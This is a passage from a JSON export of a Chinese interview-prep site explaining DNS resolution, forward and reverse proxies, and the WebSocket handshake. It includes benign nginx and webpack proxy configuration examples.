DNS服务器、DNS客户端和DNS中继\n\n网络中与DNS相关的设备角色包括DNS服务器、DNS客户端和DNS中继。\n\n### DNS服务器\n\nDNS服务器是将域名指向对应IP地址的服务器。DNS服务器中保存了一张域名和与之相对应的IP地址的表，以解析消息的域名。\n\n由于互联网连通的是全球资源，单一的域名服务器不足以支撑全部的地址转换操作，因此全球有多套域名服务器相互配合使用。\n\n域名是分层结构，域名DNS服务器也是对应的层级结构。通过根域名服务器，依次请求顶级域名服务器和权威域名服务器，最终获取对应IP地址，并将该结果保存在本地域名服务器，以待下次DNS请求使用。当用户再次对同一域名发起访问时，可以直接从本地域名服务器获得结果，无需再次发起全球递归查询。\n\n表1-2 DNS服务器的分类\n\n| 分类 | 作用 |\n| --- | --- |\n| 根DNS服务器 | 根DNS服务器是最高层次的域名服务器，它知道所有顶级服务器的域名和IP地址，当本地域名服务器无法对域名进行解析时，首先对根域名服务器发起请求。 |\n| 顶级域名服务器 | 顶级域名服务器负责管理该服务器下的所有二级域名，当收到DNS查询请求时，就会给权威域名服务器相应的回答。 |\n| 权威域名服务器 | 负责某一个区域的域名服务器。当一个顶级域名服务器还不能给出最后查询回答时，就会告知下一步应当请求的权威域名服务器。 |\n| 本地域名服务器 | 当一个主机发出DNS查询请求时，这个查询请求报文就发送给本地域名服务器。每一个互联网服务提供者ISP都可以拥有一个本地域名服务器。当本地域名服务器无法给出应答时，就会请求最高级的根域名服务器。 |\n\n### DNS客户端\n\nDNS客户端的作用是接收用户程序（User Program）的DNS请求，并对其作出回应。作为DNS客户端的设备上一般具备以下能力：\n\n1. 启动DNS解析\n\n   要使用DNS客户端功能，需要在设备上打开DNS解析的开关。\n2. 指定服务器的IP地址\n\n   要进行DNS域名解析，需要在设备上指定DNS服务器的IP地址。这样才能把查询请求发动到正确的DNS服务器上进行解析。\n3. 指定DNS域后缀搜索列表\n\n   DNS客户端所访问的一些服务器或主机的域名后缀往往都是相同的。用户可以预先设置一些域名后缀，在域名解析的时候，用户只需要输入域名的部分字段，系统会自动将输入域名加上不同的后缀进行解析。例如，用户想查询域名“huawei.com”，那么可以在后缀列表中配置com，然后输入“huawei”，系统会自动将输入域名与后缀连接成“huawei.com”进行查询。\n\n### DNS中继\n\n当DNS服务器的IP地址发生变化时，用户网络中每个DNS客户端上的配置都需要改变，这样工作量极大并且容易出错。此时，可以通过部署DNS中继解决该问题。DNS客户端上配置DNS中继的IP地址，DNS服务器的IP地址在DNS中继上配置。之后，DNS客户端会将DNS请求报文直接发送给DNS中继，由DNS中继将收到的DNS请求报文转发至DNS服务器。由此，当DNS服务器的IP地址发生变化时，仅需改变DNS中继上的配置即可，简化了网络管理。\n\nDNS中继的工作原理\n\n1. DNS客户端将DNS请求报文发送给DNS中继，即请求报文的目的地址为DNS中继的IP地址。\n2. DNS中继收到请求报文后，将报文转发给DNS服务器，通过DNS服务器进行域名解析。\n\n## DNS域名解析过程\n\n通过域名获取对应IP地址的过程称为域名解析。DNS域名解析分为以下两种方式：\n\n* 静态域名解析\n\n  静态域名解析是通过静态域名解析表进行的，即手动建立域名和IP地址之间的对应关系表，该表的作用可以将一些常用的域名放入表中。当DNS客户端需要域名所对应的IP地址时，即到静态域名解析表中去查找指定的域名，从而获得所对应的IP地址，提高域名解析的效率\n\n* 动态域名解析\n\n  动态域名解析需要专用的域名解析服务器（DNS服务器）运行域名解析服务器程序，提供从域名到IP地址的映射关系，负责接收客户提出的域名解析请求。\n\n为提高查询速度，在解析域名时，首先采用静态域名解析的方法，如果静态解析不成功，再采用动态域名解析的方法。\n\nDNS的工作过程如下：\n\n1. 用户程序（如ping、telnet等）使用域名访问网络时，首先向DNS客户端的地址解析器发出DNS请求。\n2. 地址解析器收到DNS请求后，首先查询本地域名缓存。\n   * 如果本地域名缓存中存在该域名对应的映射表项，地址解析器就直接将域名对应的IP地址返回给用户程序。\n   * 如果本地域名缓存中不存在所要查找的映射表项，地址解析器就向DNS服务器发送查询请求报文。\n3. DNS服务器收到查询报文后，首先判断请求的域名是否处于自己被授权管理的子域里，再根据不同的判断结果，向DNS客户端发送相应的响应报文。\n   * 如果请求的域名在自己被授权管理的子域范围之内，该DNS服务器首先从自己的数据库中查找域名对应的IP地址。\n   * 如果请求的域名不在自己被授权管理的子域范围之内，该DNS服务器就将请求交给上一级的DNS服务器处理。DNS服务器完成解析后，将解析的结果返回给DNS客户端。\n4. DNS客户端的地址解析器接收并解析DNS服务器发回来的响应报文，将解析结果返回给用户程序。\n\n每次动态解析成功的域名与IP地址的映射均存放在动态域名缓存区中，当下一次查询相同域名的时候，就可以直接从缓存区中读取，不用再向域名服务器进行请求。缓存区中的映射在一段时间后会被老化删除，以保证及时从域名服务器得到最新的内容。\n\n## DDNS客户端\n\n利用DNS可以将域名解析为IP地址，从而实现使用域名来访问网络中的节点。但是，DNS仅提供了域名和IP地址之间的静态对应关系，当节点的IP地址发生变化时，DNS服务器无法动态地更新域名和IP地址的映射关系。此时，如果仍然使用域名访问该节点，通过域名解析得到的IP地址是错误的，从而导致访问失败。动态域名系统DDNS（Dynamic Domain Name System）用来动态更新DNS服务器上域名和IP地址之间的映射关系，保证通过域名解析到正确的IP地址。\n\nPC需要通过域名访问提供应用层服务的设备DeviceA。DeviceA接入Internet的接口从网络运营商动态获取IP地址，由于每次获取到的IP地址不同，导致域名和IP地址的对应关系会发生变化。而传统的DNS无法动态更新域名和IP地址的对应关系，这就会导致PC访问DeviceA失败。此时，可通过部署DDNS服务器来解决该问题。\n\n1. DeviceA作为DDNS客户端，当IP地址变化时，向DDNS服务器发送更新域名和IP地址映射关系的DDNS更新请求。\n2. DDNS服务器接收到DDNS客户端的DDNS更新请求后，负责通知DNS服务器动态更新域名和IP地址之间的映射关系。从而保证即使设备的IP地址改变，Internet用户仍然可以通过同样的域名访问设备。",
    "testPoint": "DNS（Domain Name System）解析是前端工程师在**网络性能优化、安全、浏览器请求流程**等面试方向中不可忽视的知识点。\n\n## 一、基础概念考察\n\n| 考点         | 说明                      |\n| ---------- | ----------------------- |\n| DNS 是什么？   | 域名系统，用于将**域名解析为 IP 地址** |\n| 为什么需要 DNS？ | 因为人记域名更方便，而网络通信需要 IP    |\n| DNS 的作用    | 类似“互联网电话簿”，域名 ↔ IP 映射   |\n| DNS 属于哪个协议 | 应用层协议，默认使用 UDP（53 端口）   |\n\n## 二、DNS 解析流程（重点）\n\nDNS 解析过程通常包含以下步骤：\n\n1. 浏览器缓存查询\n2. 操作系统缓存查询\n3. hosts 文件查询\n4. 本地 DNS 服务器（ISP 提供）查询\n5. 根域名服务器（.`.`）返回顶级域名服务器地址\n6. 顶级域名服务器返回权威域名服务器地址\n7. 权威域名服务器返回目标域名对应 IP\n8. 本地 DNS 服务器将结果缓存并返回\n\n**递归查询** 与 **迭代查询**：\n\n* **递归查询**：客户端向本地 DNS 请求，期望拿到最终 IP，其他查询步骤由 DNS 服务器完成。\n* **迭代查询**：DNS 服务器自己一步步查找其他服务器来获取结果。\n\n## 三、DNS 缓存机制考察\n\n| 缓存位置      | 特点                                         |\n| --------- | ------------------------------------------ |\n| 浏览器缓存     | 优先读取，缓存时间受 `DNS TTL` 控制                    |\n| 系统缓存      | 如 `macOS` 的 `dscacheutil`、Windows 的 DNS 缓存 |\n| 本地 DNS 缓存 | 运营商提供，缓存命中高，减少外部请求                         |\n\n相关字段：\n\n* **TTL（Time To Live）**：DNS 记录生存时间，影响缓存有效期\n\n## 四、DNS 查询性能优化（常考）\n\n| 技术/策略      | 说明                                                                              |\n| ---------- | ------------------------------------------------------------------------------- |\n| DNS 预获取    | `<link rel=\"dns-prefetch\" href=\"//example.com\">`，提前解析域名                         |\n| preconnect | `<link rel=\"preconnect\" href=\"https://example.com\">`，提前建立连接（包括 DNS + TCP + TLS） |\n| 缓存优化       | 提高 DNS TTL，减少频繁解析                                                               |\n| 合理分域名访问资源  | 避免过多不同域名导致 DNS 查询阻塞                                                             |\n\n## 五、DNS 安全考察\n\n| 威胁                  | 说明                                                       |\n| ------------------- | -------------------------------------------------------- |\n| DNS 劫持              | 恶意篡改解析结果，用户被引导至假冒网站                                      |\n| DNS 投毒              | 缓存伪造 IP，污染 DNS 服务器结果                                     |\n| 防护措施                | 使用 DNSSEC（域名系统安全扩展）验证响应签名；启用 HTTPS-DNS（DoH/DoT）加密 DNS 查询 |\n| DoH（DNS over HTTPS） | 将 DNS 查询通过 HTTPS 发送，防止被监听或篡改                             |\n\n## 六、DNS 与前端的关联考察点\n\n| 关联方向           | 说明                                                                      |\n| -------------- | ----------------------------------------------------------------------- |\n| 页面首次加载慢        | 可能由于 DNS 查询时间长，可使用 `performance.getEntriesByType('resource')` 检查 DNS 时间 |\n| 域名切换带来的缓存失效    | 资源域名变化会触发新的 DNS 查询和重新建立连接                                               |\n| 第三方资源加载慢       | 如字体、CDN、图标等域名没有预解析                                                      |\n| CNAME、CDN 解析过程 | CDN 域名背后也可能经过多次 DNS 跳转解析                                                |\n\n## 七、面试常见问题示例\n\n| 问题                     | 涉及考点         |\n| ---------------------- | ------------ |\n| DNS 是什么？为什么需要它？        | 基础原理         |\n| DNS 查询的完整流程是怎样的？       | 缓存、递归与迭代查询   |\n| DNS 查询用的是哪个协议？         | UDP（53 端口）为主 |\n| 浏览器如何优化 DNS 性能？        | DNS 预获取、预连接  |\n| 什么是 DNS 劫持？如何防止？       | 安全考察         |\n| DNS TTL 的作用？           | 缓存机制与刷新间隔    |\n| 为什么首次加载慢？如何判断是 DNS 问题？ | 前端性能分析工具使用   |",
    "exerciseKeyList": "[\"c1aefc66-c3cb-4e29-961d-84a341071d8e\",\"d76e76c3-7400-4c6e-958a-b5f00916d47d\",\"33c7d09a-4394-480b-a513-85bb834cbeff\",\"bc7a4856-3f5e-4b7d-8380-bae505e9ee35\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T04:08:12.000Z",
    "updateAt": "2025-08-06T07:07:58.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "33c7d09a-4394-480b-a513-85bb834cbeff",
        "title": "什么是DNS劫持？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-20T15:08:41.000Z",
        "updateAt": "2024-08-10T17:06:19.000Z"
      },
      {
        "exerciseKey": "bc7a4856-3f5e-4b7d-8380-bae505e9ee35",
        "title": "DNS协议介绍",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:57:37.000Z",
        "updateAt": "2024-07-19T18:03:36.000Z"
      },
      {
        "exerciseKey": "c1aefc66-c3cb-4e29-961d-84a341071d8e",
        "title": "DNS 协议了解多少?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:43:01.000Z"
      },
      {
        "exerciseKey": "d76e76c3-7400-4c6e-958a-b5f00916d47d",
        "title": "DNS 预解析是什么？怎么实现？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T05:48:05.000Z",
        "updateAt": "2024-08-10T17:06:47.000Z"
      }
    ]
  },
  "236": {
    "id": 236,
    "tagId": 16,
    "title": "正向代理和反向代理",
    "explanation": "### 1\\. 概念\n\n  正向代理是一个位于客户端和目标服务器之间的代理服务器(中间服务器)。为了从原始服务器取得内容，客户端向代理服务器发送一个请求，并且指定目标服务器，之后代理向目标服务器转交并且将获得的内容返回给客户端。正向代理的情况下客户端必须要进行一些特别的设置才能使用。\n\n  反向代理正好相反。对于客户端来说，反向代理就好像目标服务器。并且客户端不需要进行任何设置。客户端向反向代理发送请求，接着反向代理判断请求走向何处，并将请求转交给客户端，使得这些内容就好似他自己一样，一次客户端并不会感知到反向代理后面的服务，也因此不需要客户端做任何设置，只需要把反向代理服务器当成真正的服务器就好了。\n\n### 2\\. 区别\n\n  正向代理需要你主动设置代理服务器ip或者域名进行访问，由设置的服务器ip或者域名去获取访问内容并返回；而反向代理不需要你做任何设置，直接访问服务器真实ip或者域名，但是服务器内部会自动根据访问内容进行跳转及内容返回，你不知道它最终访问的是哪些机器。\n\n  正向代理是代理客户端，为客户端收发请求，使真实客户端对服务器不可见；而反向代理是代理服务器端，为服务器收发请求，使真实服务器对客户端不可见。\n\n  从上面的描述也能看得出来正向代理和反向代理最关键的两点区别：\n\n-   是否指定目标服务器\n-   客户端是否要做设置 下面用一张图来表示两者的差异：\n    \n      \n    ![](https://static.ecool.fun//article/a9e457b5-f93a-4d46-a58e-286f3481d686.png) _正向代理与反向代理_\n\n  正向代理中，proxy和client同属一个LAN，对server透明； 反向代理中，proxy和server同属一个LAN，对client透明。 实际上proxy在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。\n\n  从用途上来区分：\n\n-   正向代理：正向代理用途是为了在防火墙内的局域网提供访问internet的途径。另外还可以使用缓冲特性减少网络使用率\n-   反向代理：反向代理的用途是将防火墙后面的服务器提供给internet用户访问。同时还可以完成诸如负载均衡等功能\n\n  从安全性来讲：\n\n-   正向代理：正向代理允许客户端通过它访问任意网站并且隐蔽客户端自身，因此你必须采取安全措施来确保仅为经过授权的客户端提供服务\n-   反向代理：对外是透明的，访问者并不知道自己访问的是代理。对访问者而言，他以为访问的就是原始服务器\n\n### 3\\. 使用场景\n\n  正向代理的典型用途是为在防火墙内的局域网客户端提供访问Internet的途径。正向代理还可以使用缓冲特性减少网络使用率。反向代理的典型用途是将 防火墙后面的服务器提供给Internet用户访问。反向代理还可以为后端的多台服务器提供负载平衡，或为后端较慢的服务器提供缓冲服务。\n\n##### 3.1 正向代理\n\n  从上面的介绍也就可以猜出来正向代理的至少一个功能（俗称翻墙），也即：\n\n  用户A无法访问facebook，但是能访问服务器B，而服务器B可以访问facebook。于是用户A访问服务器B，通过服务器B去访问facebook，，服务器B收到请求后，去访问facebook，facebook把响应信息返回给服务器B，服务器B再把响应信息返回给A。这样，通过代理服务器B，就实现了翻墙。\n\n##### 3.2 反向代理\n\n  从上面的介绍也可以猜出来反向代理的至少一个功能（比如负载均衡），也即：\n\n  假设用户A访问 **www.somesite.com/something.html**，但 www.somesite.com 上并不存在something.html页面，于是接收用户请求的该服务器就偷偷从另外一台服务器上取回来，然后返回给用户，而用户并不知道something.html页面究竟位于哪台机器上。\n\n  反向代理的作用就比较多了，这里简单列举一下：\n\n-   保护和隐藏原始资源服务器\n-   加密和SSL加速\n-   负载均衡\n-   缓存静态内容\n-   压缩\n-   减速上传\n-   安全\n-   外网发布\n\n  下面做两个简单介绍\n\n#### 保护和隐藏原始资源服务器\n\n![](https://static.ecool.fun//article/3afbac1c-15ac-4d7f-a23b-d4949b916ae8.png) _代理作用_  \n\n  用户A始终认为它访问的是原始服务器B而不是代理服务器Z，但实用际上反向代理服务器接受用户A的应答，从原始资源服务器B中取得用户A的需求资源，然后发送给用户A。由于防火墙的作用，只允许代理服务器Z访问原始资源服务器B。尽管在这个虚拟的环境下，防火墙和反向代理的共同作用保护了原始资源服务器B，但用户A并不知情。\n\n#### 负载均衡\n\n![](https://static.ecool.fun//article/97cdb3fd-e9e7-40fc-82b4-ea6ddee11eaf.png) _负载均衡_  \n\n  当反向代理服务器不止一个的时候，我们甚至可以把它们做成集群，当更多的用户访问资源服务器B的时候，让不同的代理服务器Z（x）去应答不同的用户，然后发送不同用户需要的资源。\n\n##### 3.3 透明代理\n\n  透明代理比较类似正向代理的功能，差别在于客户端根本不知道代理的存在，它改编你的request，并会传送真实IP（使用场景就是公司限制网络的访问）。\n\n  比如为了工作效率或者安全，A公司屏蔽了QQ软件的使用。A公司的员工接上了网络，但发现无法使用qq。这就是透明代理捣的鬼。公司在内网和外网的中间插入一个透明代理，这个代理会根据规则抓取请求内容，遇到qq的请求我就把这个请求给屏蔽掉，这样就完成了透明屏蔽。当然了，如果你明白原理，就可以自己搞个正向代理来绕过公司的屏蔽。\n\n  Nginx作为时下最流行的HTTP服务器之一，同时它是一个反向代理服务器，提到反向代理服务器，有同学可能觉得这个概念很模糊，如果说到代理，他可能明白，但是再引出一个正向代理，估计懵了，笔者将尝试用浅显易懂的比方把这两个概念解释清楚。\n\n## 正向代理\n\n  A同学在大众创业、万众创新的大时代背景下开启他的创业之路，目前他遇到的最大的一个问题就是启动资金，于是他决定去找马云爸爸借钱，可想而知，最后碰一鼻子灰回来了，情急之下，他想到一个办法，找关系开后门，经过一番消息打探，原来A同学的大学老师王老师是马云的同学，于是A同学找到王老师，托王老师帮忙去马云那借500万过来，当然最后事成了。不过马云并不知道这钱是A同学借的，马云是借给王老师的，最后由王老师转交给A同学。这里的王老师在这个过程中扮演了一个非常关键的角色，就是代理，也可以说是正向代理，王老师代替A同学办这件事，这个过程中，真正借钱的人是谁，马云是不知道的，这点非常关键。\n\n  我们常说的代理也就是只正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，知名的科学上网工具shadowsocks 扮演的就是典型的正向代理角色。在天朝用浏览器访问 [www.google.com](https://link.jianshu.com?t=http://www.google.com \"https://link.jianshu.com?t=http://www.google.com\") 时，被残忍的拒绝了，于是你可以在国外搭建一台代理服务器，让代理帮我去请求[google.com](https://link.jianshu.com?t=http://google.com \"https://link.jianshu.com?t=http://google.com\")，代理把请求返回的相应结构再返回给我。  \n\n![](https://static.ecool.fun//article/7fcdd016-2ca9-4b97-b5fb-bb872b78e1c0.png) _\n\n## 反向代理\n\n  大家都有过这样的经历，拨打10086客服电话，可能一个地区的10086客服有几个或者几十个，你永远都不需要关心在电话那头的是哪一个，叫什么，男的，还是女的，漂亮的还是帅气的，你都不关心，你关心的是你的问题能不能得到专业的解答，你只需要拨通了10086的总机号码，电话那头总会有人会回答你，只是有时慢有时快而已。那么这里的10086总机号码就是我们说的反向代理。客户不知道真正提供服务人的是谁。\n\n  反向代理隐藏了真实的服务端，当我们请求 [www.baidu.com](http://www.baidu.com) 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了，`www.baidu.com` 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。  \n\n![](https://static.ecool.fun//article/9a76315f-ecbb-49a2-bd48-779d52d23ed2.png)\n\n  两者的区别在于代理的对象不一样：正向代理代理的对象是客户端，反向代理代理的对象是服务端",
    "testPoint": "“正向代理”和“反向代理”是前端与网络交叉领域的高频考察点，涉及**网络请求过程、安全控制、架构设计、前端跨域处理**等多个方面。\n\n## 一、基础定义（核心区别）\n\n| 类型       | 代理对象          | 作用方位      | 用户是否感知 |\n| -------- | ------------- | --------- | ------ |\n| **正向代理** | **客户端 → 服务端** | 客户端访问外部资源 | **是**  |\n| **反向代理** | **服务端 → 客户端** | 服务端代理多个后端 | **否**  |\n\n---\n\n## 二、举例理解\n\n* **正向代理**：你无法直接访问被墙的 `google.com`，通过代理服务器 `proxy.com` 访问，`proxy.com` 再去请求 `google.com` 并返回结果给你。\n\n  * 常用于：**翻墙、隐匿用户身份、访问受限资源**\n\n* **反向代理**：你访问 `api.example.com`，请求先到反向代理服务器（如 Nginx），再转发到真正的后端服务（如 `node1.internal`）。\n\n  * 常用于：**负载均衡、缓存、统一鉴权、隐藏服务结构**\n\n---\n\n## 三、典型面试考察点\n\n### 1. 正向代理考察点\n\n| 点位   | 要点                                     |\n| ---- | -------------------------------------- |\n| 作用   | 客户端通过代理访问目标资源                          |\n| 应用场景 | 翻墙、匿名访问、突破访问限制（如公司内网限制访问外网）            |\n| 原理   | 客户端将目标地址请求发给代理 → 代理向目标服务器请求 → 返回结果给客户端 |\n| 实现方式 | 浏览器配置代理地址，或使用程序设置代理                    |\n| 安全性  | 会暴露目标地址，用户身份可能被记录                      |\n\n### 2. 反向代理考察点\n\n| 点位   | 要点                                |\n| ---- | --------------------------------- |\n| 作用   | 客户端访问代理服务器，由代理向真实服务请求             |\n| 应用场景 | 负载均衡、服务聚合、缓存加速、安全防护、隐藏内部服务        |\n| 原理   | 客户端只知道代理地址，代理内部根据路径、策略转发请求        |\n| 实现方式 | 使用 Nginx、Apache、Node.js 等配置反向代理规则 |\n| 安全性  | 屏蔽真实服务地址，方便统一鉴权和防护（如 DDOS）        |\n\n---\n\n## 四、与前端的关系\n\n| 考察方向   | 说明                                                  |\n| ------ | --------------------------------------------------- |\n| 跨域处理   | 本地开发环境通过 `devServer.proxy` 或 Nginx 设置反向代理 → 绕过 CORS |\n| 资源访问加速 | 前端资源或 API 接口通过反向代理 CDN/缓存节点加速                       |\n| 统一接口转发 | 前端请求统一发给一个网关地址，网关做反向代理路由分发                          |\n| SSR 渲染 | 前端请求 SSR 服务 → 反向代理渲染结果页面返回                          |\n\n---\n\n## 五、常见面试问题\n\n| 面试问题                    | 涉及知识点                               |\n| ----------------------- | ----------------------------------- |\n| 正向代理和反向代理的区别？           | 代理方向、用户是否感知、应用场景                    |\n| 为什么前端开发时使用反向代理可以解决跨域问题？ | 跨域绕过原理、同源策略                         |\n| 如何使用 Nginx 设置反向代理？      | Nginx 配置规则                          |\n| 服务端如何实现接口聚合？            | 反向代理网关分发请求                          |\n| 如何隐藏真实服务地址？             | 利用反向代理统一出口                          |\n| CDN 是正向代理还是反向代理？        | **反向代理（常考陷阱题）**，CDN 面向用户，但代理的是服务器资源 |\n\n## 六、配套场景理解\n\n* Nginx 配置反向代理示例：\n\n  ```nginx\n  location /api/ {\n    proxy_pass http://backend-server/;\n    proxy_set_header Host $host;\n  }\n  ```\n\n* Webpack DevServer 开发时的代理设置（前端 CORS 绕过）：\n\n  ```js\n  devServer: {\n    proxy: {\n      '/api': {\n        target: 'http://localhost:3000',\n        changeOrigin: true,\n      },\n    }\n  }\n  ```\n\n## 七、扩展考点\n\n| 扩展点           | 说明                               |\n| ------------- | -------------------------------- |\n| CDN 是否属于代理    | 属于反向代理（缓存 + 加速）                  |\n| 网关与反向代理的区别    | 网关具备更强的逻辑、鉴权、路由能力                |\n| 微服务架构中反向代理的作用 | 服务聚合、统一入口、灰度发布等                  |\n| TLS 终止代理      | Nginx 处理 SSL，后端走明文 HTTP，简化后端服务配置 |\n",
    "exerciseKeyList": "[\"31a0560a-db67-424e-8ad7-5dc1f04a11b7\"]",
    "vipLimit": 1,
    "level": 1.5,
    "pointOrder": 1,
    "createAt": "2025-07-28T04:15:36.000Z",
    "updateAt": "2025-08-06T06:46:57.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "31a0560a-db67-424e-8ad7-5dc1f04a11b7",
        "title": "正向代理和反向代理分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-19T14:00:57.000Z",
        "updateAt": "2024-08-10T17:05:27.000Z"
      }
    ]
  },
  "239": {
    "id": 239,
    "tagId": 16,
    "title": "WebSocket相关",
    "explanation": "## 一、前言\n\n因为项目中使用到了 WebSocket ，面试官在深挖项目经验的时候，也难免提到 WebSocket 相关的知识点，通过这篇文章再做一下总结。\n\n## 二、什么是WebSocket\n\nWebSocket 是一种在单个TCP连接上进行全双工通信的协议。WebSocket 使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。\n\n在 WebSocket API 中，浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接， 并进行双向数据传输。\n\nWebSocket本质上一种`计算机网络应用层的协议`，用来弥补http协议在持久通信能力上的不足。\n\nWebSocket 协议在2008年诞生，2011年成为国际标准。现在最新版本浏览器都已经支持了。\n\n它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于[服务器推送技术](https://en.wikipedia.org/wiki/Push_technology)的一种。\n\nWebSocket 的其他特点包括：\n\n（1）建立在 TCP 协议之上，服务器端的实现比较容易。\n\n（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。\n\n（3）数据格式比较轻量，性能开销小，通信高效。\n\n（4）可以发送文本，也可以发送二进制数据。\n\n（5）没有同源限制，客户端可以与任意服务器通信。\n\n（6）协议标识符是`ws`（如果加密，则为`wss`），服务器网址就是 URL。\n\n```\nws://example.com:80/some/path\n\n```\n\n![](https://static.ecool.fun//article/18e4ecba-03bc-497c-a90d-265be4b3c346.awebp)\n\n### 为什么需要 WebSocket？\n\n我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？\n\n因为 HTTP 协议有一个缺陷：通信只能由客户端发起，不具备服务器推送能力。\n\n举例来说，我们想了解查询今天的实时数据，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。\n\n![](https://static.ecool.fun//article/478f86e0-4a55-42e5-b721-2afaee53f5d7.awebp)\n\n这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用[\"轮询\"](https://www.pubnub.com/blog/2014-12-01-http-long-polling/)：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。\n\n在 WebSocket 协议出现以前，创建一个和服务端进双通道通信的 web 应用，需要依赖HTTP协议，进行不停的轮询，这会导致一些问题：\n\n* 服务端被迫维持来自每个客户端的大量不同的连接\n* 大量的轮询请求会造成高开销，比如会带上多余的header，造成了无用的数据传输。\n\nhttp协议本身是没有持久通信能力的，但是我们在实际的应用中，是很需要这种能力的，所以，为了解决这些问题，WebSocket协议由此而生，于2011年被IETF定为标准RFC6455，并被RFC7936所补充规范。\n\n并且在HTML5标准中增加了有关WebSocket协议的相关api，所以只要实现了HTML5标准的客户端，就可以与支持WebSocket协议的服务器进行全双工的持久通信了。\n\n### WebSocket 与 HTTP 的区别\n\nWebSocket 与 HTTP的关系图：\n\n![image.png](https://static.ecool.fun//article/6f347a8c-bfde-448e-8f41-3cc927e6bc9a.awebp)\n\n**相同点：** 都是一样基于TCP的，都是可靠性传输协议。都是应用层协议。\n\n**联系：** WebSocket在建立握手时，数据是通过HTTP传输的。但是建立之后，在真正传输时候是不需要HTTP协议的。\n\n下面一张图说明了 HTTP 与 WebSocket 的主要区别：\n\n![](https://static.ecool.fun//article/2e7d4d91-0057-4d5a-ba73-dc2a393554c5.awebp)\n\n1、WebSocket是双向通信协议，模拟Socket协议，可以双向发送或接受信息，而HTTP是单向的；\n2、WebSocket是需要浏览器和服务器握手进行建立连接的，而http是浏览器发起向服务器的连接。\n\n注意：虽然HTTP/2也具备服务器推送功能，但HTTP/2 只能推送静态资源，无法推送指定的信息。\n\n## 三、WebSocket协议的原理\n\n与http协议一样，WebSocket协议也需要通过已建立的TCP连接来传输数据。具体实现上是通过http协议建立通道，然后在此基础上用真正的WebSocket协议进行通信，所以WebSocket协议和http协议是有一定的交叉关系的。\n\n首先，WebSocket 是一个持久化的协议，相对于 HTTP 这种非持久的协议来说。简单的举个例子吧，用目前应用比较广泛的 PHP 生命周期来解释。\n\nHTTP 的生命周期通过 Request 来界定，也就是一个 Request 一个 Response ，那么在 HTTP1.0 中，这次 HTTP 请求就结束了。\n\n在 HTTP1.1 中进行了改进，使得有一个 keep-alive，也就是说，在一个 HTTP 连接中，可以发送多个 Request，接收多个 Response。但是请记住 Request = Response， 在 HTTP 中永远是这样，也就是说一个 Request 只能有一个 Response。而且这个 Response 也是被动的，不能主动发起。\n\n首先 WebSocket 是基于 HTTP 协议的，或者说借用了 HTTP 协议来完成一部分握手。\n\n首先我们来看个典型的 WebSocket 握手\n\n```\nGET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n\n```\n\n熟悉 HTTP 的童鞋可能发现了，这段类似 HTTP 协议的握手请求中，多了这么几个东西。\n\n```\nUpgrade: websocket\nConnection: Upgrade\n\n```\n\n这个就是 WebSocket 的核心了，告诉 Apache 、 Nginx 等服务器：注意啦，我发起的请求要用 WebSocket 协议，快点帮我找到对应的助理处理~而不是那个老土的 HTTP。\n\n```\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\n\n```\n\n首先， Sec-WebSocket-Key 是一个 Base64 encode 的值，这个是浏览器随机生成的，告诉服务器：泥煤，不要忽悠我，我要验证你是不是真的是 WebSocket 助理。\n\n然后， Sec\\_WebSocket-Protocol 是一个用户定义的字符串，用来区分同 URL 下，不同的服务所需要的协议。简单理解：今晚我要服务A，别搞错啦~\n\n最后， Sec-WebSocket-Version 是告诉服务器所使用的 WebSocket Draft （协议版本），在最初的时候，WebSocket 协议还在 Draft 阶段，各种奇奇怪怪的协议都有，而且还有很多期奇奇怪怪不同的东西，什么 Firefox 和 Chrome 用的不是一个版本之类的，当初 WebSocket 协议太多可是一个大难题。。不过现在还好，已经定下来啦~大家都使用同一个版本： 服务员，我要的是13岁的噢→\\_→\n\n然后服务器会返回下列东西，表示已经接受到请求， 成功建立 WebSocket 啦！\n\n```\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n\n```\n\n这里开始就是 HTTP 最后负责的区域了，告诉客户，我已经成功切换协议啦~\n\n```\nUpgrade: websocket\nConnection: Upgrade\n\n```\n\n依然是固定的，告诉客户端即将升级的是 WebSocket 协议，而不是 mozillasocket，lurnarsocket 或者 